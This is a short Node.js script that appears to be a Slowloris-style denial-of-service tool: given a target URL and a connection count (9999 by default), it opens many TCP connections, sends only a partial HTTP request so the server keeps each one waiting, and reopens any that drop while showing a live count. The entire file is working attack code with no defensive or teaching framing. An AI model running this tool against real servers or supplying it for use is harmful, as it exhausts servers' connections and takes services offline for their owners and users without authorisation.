const net = require('net');
const parse = require('url').parse;

//url
let url = process.argv[2];
url = parse(url)
const args = {
	host: url.hostname,
	port: url.port || 80
}

//number of connections
let c = process.argv[3] || 9999

//alive connections
let alive = 0;

const open = ()=>{
	alive++;
	const client = net.connect(args.port, args.host, ()=> {		
		//send just a part of the header, so the server keeps waiting for the rest of the request
		client.write('GET / HTTP/1.1\r\n');
	});	
	
	client.on('error', function() {
		//open a new connection every time a connection dies;
		alive --;
		open();
	});
}

const status = ()=>{
  const P = ["\\", "|", "/", "-"];
  let x = 0;
  return setInterval(()=>{
    process.stdout.write("\r" + P[x++] + " Active connections: " + alive);
    if(x==4)x = 0;
  }, 100);
}

//starting
status();
while(c--){open()}
